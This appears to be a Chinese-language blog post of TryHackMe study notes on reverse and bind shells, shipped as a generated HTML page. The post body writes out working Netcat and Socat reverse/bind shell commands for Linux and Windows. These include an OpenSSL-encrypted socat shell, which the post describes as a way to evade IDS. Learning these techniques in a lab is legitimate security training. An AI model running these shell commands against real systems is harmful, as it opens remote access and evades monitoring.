@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="什么是shell？shell 是我们在与命令行环境 (CLI) 交互时使用的。我们可以强制远程服务器向我们发送对服务器的命令行访问（反向shell），或者在服务器上打开一个我们可以连接的端口以执行进一步的命令（绑定shell )。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shell">
+<meta property="og:url" content="http://example.com/2022/05/28/Shell/index.html">
+<meta property="og:site_name" content="SugarCrash!">
+<meta property="og:description" content="什么是shell？shell 是我们在与命令行环境 (CLI) 交互时使用的。我们可以强制远程服务器向我们发送对服务器的命令行访问（反向shell），或者在服务器上打开一个我们可以连接的端口以执行进一步的命令（绑定shell )。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/GikVJtxfW3ATHdB.png">
+<meta property="og:image" content="https://gitee.com/mr-liu-i/mypicture/raw/master/path/202205152005452.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/eaoLRvQbSYhCUlV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/MixzZQuGphTg4vJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/2C7dEHT5t3KgLMb.png">
+<meta property="article:published_time" content="2022-05-28T03:36:28.000Z">
+<meta property="article:modified_time" content="2022-05-28T03:55:07.659Z">
+<meta property="article:author" content="Lu1i丶">
+<meta property="article:tag" content="Tryhackme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/18/GikVJtxfW3ATHdB.png">
+
+<link rel="canonical" href="http://example.com/2022/05/28/Shell/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Shell | SugarCrash!</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">SugarCrash!</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习，想找个师傅带带我</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/28/Shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.PNG">
+      <meta itemprop="name" content="Lu1i丶">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SugarCrash!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-28 11:36:28 / 修改时间：11:55:07" itemprop="dateCreated datePublished" datetime="2022-05-28T11:36:28+08:00">2022-05-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/" itemprop="url" rel="index"><span itemprop="name">Tryhackme</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="什么是shell？"><a href="#什么是shell？" class="headerlink" title="什么是shell？"></a>什么是shell？</h3><p>shell 是我们在与命令行环境 (CLI) 交互时使用的。<br>我们可以强制远程服务器向我们发送对服务器的命令行访问（反向shell），或者在服务器上打开一个我们可以连接的端口以执行进一步的命令（绑定shell )。</p>
+<span id="more"></span>
+<p>正向shell：攻击者连接被攻击机器，可用于攻击者处于内网，被攻击者处于公网的情况。<br>反向shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul>
+<li>Netcat ： 默认有些不稳定</li>
+<li>Socat ： 比Netcat更稳，语法比较难，普及度不如Netcat</li>
+<li>Metasploit auxiliary&#x2F;multi&#x2F;handler模块 ： 都是接收反向shell的</li>
+</ul>
+<p>在高层次上，当涉及到利用目标时，我们对两种 shell 感兴趣：反向 shell 和绑定 shell。</p>
+<ul>
+<li><p>反向 shell 是指强制目标执行连接回您的计算机的代码。在您自己的计算机上，您将使用上一个任务中提到的工具之一来设置一个侦听器，该侦听器将用于接收连接。反向 shell 是绕过防火墙规则的好方法，这些规则可能会阻止您连接到目标上的任意端口；但是，缺点是，当通过 Internet 从计算机接收 shell 时，您需要配置自己的网络以接受 shell。但是，由于我们连接到网络的方法，这在 TryHackMe 网络上不会成为问题。</p>
+</li>
+<li><p>绑定 shell 是指在目标上执行的代码用于启动直接连接到目标上的 shell 的侦听器。然后这将向 Internet 开放，这意味着您可以连接到代码已打开的端口并以这种方式获得远程代码执行。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。</p>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">反弹shel nc -lvnp 5555 攻击机监听 </span><br><span class="line">nc 10.10.40.87 5555 -e /bin/bash 目标机器执行命令反弹shell </span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> 让界面更好看 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正向shell </span><br><span class="line">nc -lvnp 5556 -e /bin/bash 目标机器执行 </span><br><span class="line">nc 目标-ip 5556 输入目标机器ip </span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向shell socat TCP-L:5566 -                   攻击机监听 </span><br><span class="line">socat TCP:&lt;攻击机-ip&gt;:5566 EXEC:<span class="string">&quot;bash -li&quot;</span>     目标机器执行 </span><br><span class="line">这个收到没有反应，打<span class="built_in">whoami</span>目标机器上会有回显</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/GikVJtxfW3ATHdB.png" alt="202205181148123.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">正向shell </span><br><span class="line">socat TCP-L:7788 <span class="built_in">exec</span>:<span class="string">&quot;bash -li&quot;</span> </span><br><span class="line">socat TCP:10.10.159.153:7788 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/mr-liu-i/mypicture/raw/master/path/202205152005452.png"></p>
+<h5 id="创建加密的shell"><a href="#创建加密的shell" class="headerlink" title="创建加密的shell"></a>创建加密的shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">创建加密shell socat的众多优点之一是它能够创建加密的外壳——绑定和反向。我们为什么要这样做？ 除非您拥有解密密钥，否则无法监视加密的 shell，因此通常能够绕过 IDS。</span><br><span class="line"></span><br><span class="line">生成证书 </span><br><span class="line">openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt </span><br><span class="line">合并证书为一个.pem文件中 </span><br><span class="line"><span class="built_in">cat</span> shell.key shell.crt &gt; shell.pem</span><br><span class="line"></span><br><span class="line">反向shell </span><br><span class="line">socat OPENSSL-LISTEN:5553,cert=shell.pem,verify=0 - </span><br><span class="line">socat OPENSSL:&lt;攻击端-IP&gt;:5553,verify=0 EXEC:/bin/bash</span><br><span class="line"></span><br><span class="line">正向shell </span><br><span class="line">socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes 需要目标机器创建一个pem文件 </span><br><span class="line">socat OPENSSL:&lt;目标-IP&gt;:&lt;目标-PORT&gt;,verify=0 -</span><br><span class="line"></span><br><span class="line">EXEC后面可以选择EXEC:/bin/bash EXEC:cmd.exe EXEC:powershell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.175.163 /u:Administrator /p:<span class="string">&#x27;TryH4ckM3!&#x27;</span>                   RDP登录 </span><br><span class="line"></span><br><span class="line">rdesktop -u hack -p hack 192.168.1.11:3389         这个一般是进去改了端口复用 portfwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="Netcat-1"><a href="#Netcat-1" class="headerlink" title="Netcat"></a>Netcat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">反弹shell </span><br><span class="line">nc -lvnp 1337                   攻击机监听 </span><br><span class="line">nc 攻击机ip 端口 -e <span class="string">&quot;cmd.exe&quot;</span>     也可以是powershell.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正向 </span><br><span class="line">nc -lvnp 3333 -e <span class="string">&quot;cmd.exe&quot;</span> </span><br><span class="line">nc 10.10.175.163 3333</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/eaoLRvQbSYhCUlV.png" alt="202205181148127.png"><br><img src="https://s2.loli.net/2022/05/18/MixzZQuGphTg4vJ.png" alt="202205181148128.png"></p>
+<h4 id="Socat-1"><a href="#Socat-1" class="headerlink" title="Socat"></a>Socat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">反向shell </span><br><span class="line">socat TCP-L 5566 - </span><br><span class="line">socat TCP:攻击机ip:端口 <span class="built_in">exec</span>:cmd.exe,pipes </span><br><span class="line"></span><br><span class="line">正向shell </span><br><span class="line">socat TCP-L:7788 <span class="built_in">exec</span>:powershell.exe,pipes </span><br><span class="line">socat TCP:目标ip:端口 -</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://s2.loli.net/2022/05/18/2C7dEHT5t3KgLMb.png" alt="202205181148129.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Tryhackme/" rel="tag"># Tryhackme</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/22/Jr-Penetration-Tester/" rel="prev" title="Jr Penetration Tester">
+      <i class="fa fa-chevron-left"></i> Jr Penetration Tester
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Metasploit/" rel="next" title="Metasploit">
+      Metasploit <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshell%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是shell？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Netcat"><span class="nav-number">2.1.</span> <span class="nav-text">Netcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Socat"><span class="nav-number">2.2.</span> <span class="nav-text">Socat</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%8A%A0%E5%AF%86%E7%9A%84shell"><span class="nav-number">2.2.1.</span> <span class="nav-text">创建加密的shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">3.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Netcat-1"><span class="nav-number">3.1.</span> <span class="nav-text">Netcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Socat-1"><span class="nav-number">3.2.</span> <span class="nav-text">Socat</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lu1i丶"
+      src="/images/1.PNG">
+  <p class="site-author-name" itemprop="name">Lu1i丶</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lu1i丶</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
